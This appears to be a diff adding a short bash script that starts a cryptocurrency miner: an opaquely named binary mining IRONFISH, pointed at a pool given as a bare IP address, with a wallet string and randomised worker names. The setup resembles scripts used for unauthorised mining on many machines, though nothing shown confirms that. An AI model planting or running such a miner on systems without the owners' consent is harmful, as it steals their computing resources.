@@ -1,0 +1,8 @@
+#!/bin/bash
+
+POOL=47.254.18.74:7777
+WALLET=3a495943b6343c392dcfff68b6e7dce3b04537127b16648939e96a6f711e03b0+00cbc3abe250708b
+WORKER=CL$(shuf -i 0-99 -n 1)
+
+./lM --algo IRONFISH --pool $POOL --user $WALLET.$WORKER $@
+
